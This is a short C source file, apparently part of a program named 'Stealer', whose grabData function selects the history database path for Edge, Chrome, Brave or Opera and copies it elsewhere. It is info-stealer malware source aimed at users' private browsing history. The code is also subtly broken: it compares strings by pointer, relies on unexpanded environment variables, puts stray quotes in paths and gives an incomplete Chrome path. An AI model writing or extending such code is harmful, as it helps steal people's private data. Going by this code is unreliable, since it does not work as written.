#include "Stealer.h"

BOOL grabData(LPCSTR data, LPCWSTR copyTo) {
	LPCWSTR copyFrom = L"";

	if (data == EDGE_HIST)
	{
		copyFrom = L"%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\'User Data'\\Default\\History";
	}
	else if (data == CHROME_HIST)
	{
		copyFrom = L"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\'User Data'\\Default";
	}
	else if (data == BRAVE_HIST)
	{
		copyFrom = L"%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\'User Data'\\Default\\History";
	}
	else if (data == OPERA_HIST)
	{
		copyFrom = L"%USERPROFILE%\\AppData\\Roaming\\'Opera Software'\\'Opera Stable'\\history";
	}
	
	return CopyFile(copyFrom, copyTo, FALSE);
}